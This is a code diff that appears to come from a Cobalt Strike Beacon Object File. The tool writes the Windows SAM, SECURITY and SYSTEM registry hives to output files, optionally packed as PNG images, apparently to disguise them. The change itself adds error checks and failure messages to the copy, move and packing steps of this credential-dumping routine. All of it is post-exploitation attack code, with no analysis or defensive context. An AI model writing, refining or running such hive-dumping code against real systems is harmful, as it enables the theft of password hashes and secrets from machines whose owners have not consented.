@@ -704,8 +704,15 @@ void go(char * args, int alen)
             if (packPng) {
                 if (PackPng(samTmpW, samOutW, !keepTemp))
                     BeaconPrintf(0, "  [+] packed %s\n", samPath);
+                else {
+                    BeaconPrintf(0, "  [!] packing failed\n");
+                    samOk = FALSE;
+                }
             } else if (keepTemp) {
-                KERNEL32$CopyFileW(samTmpW, samOutW, FALSE);
+                if (!KERNEL32$CopyFileW(samTmpW, samOutW, FALSE)) {
+                    BeaconPrintf(0, "  [!] copy failed: %lu\n", KERNEL32$GetLastError());
+                    samOk = FALSE;
+                }
             } else if (!KERNEL32$MoveFileExW(samTmpW, samOutW, MOVEFILE_REPLACE_EXISTING)) {
                 BeaconPrintf(0, "  [!] raw output not replaced: %lu\n", KERNEL32$GetLastError());
                 samOk = FALSE;
@@ -715,8 +722,15 @@ void go(char * args, int alen)
             if (packPng) {
                 if (PackPng(secTmpW, secOutW, !keepTemp))
                     BeaconPrintf(0, "  [+] packed %s\n", secPath);
+                else {
+                    BeaconPrintf(0, "  [!] packing failed\n");
+                    secOk = FALSE;
+                }
             } else if (keepTemp) {
-                KERNEL32$CopyFileW(secTmpW, secOutW, FALSE);
+                if (!KERNEL32$CopyFileW(secTmpW, secOutW, FALSE)) {
+                    BeaconPrintf(0, "  [!] copy failed: %lu\n", KERNEL32$GetLastError());
+                    secOk = FALSE;
+                }
             } else if (!KERNEL32$MoveFileExW(secTmpW, secOutW, MOVEFILE_REPLACE_EXISTING)) {
                 BeaconPrintf(0, "  [!] raw output not replaced: %lu\n", KERNEL32$GetLastError());
                 secOk = FALSE;
@@ -741,8 +755,15 @@ void go(char * args, int alen)
             if (packPng) {
                 if (PackPng(sysTmpW, sysOutW, !keepTemp))
                     BeaconPrintf(0, "  [+] packed %s\n", sysPath);
+                else {
+                    BeaconPrintf(0, "  [!] packing failed\n");
+                    sysOk = FALSE;
+                }
             } else if (keepTemp) {
-                KERNEL32$CopyFileW(sysTmpW, sysOutW, FALSE);
+                if (!KERNEL32$CopyFileW(sysTmpW, sysOutW, FALSE)) {
+                    BeaconPrintf(0, "  [!] copy failed: %lu\n", KERNEL32$GetLastError());
+                    sysOk = FALSE;
+                }
             } else if (!KERNEL32$MoveFileExW(sysTmpW, sysOutW, MOVEFILE_REPLACE_EXISTING)) {
                 BeaconPrintf(0, "  [!] raw output not replaced: %lu\n", KERNEL32$GetLastError());
                 sysOk = FALSE;
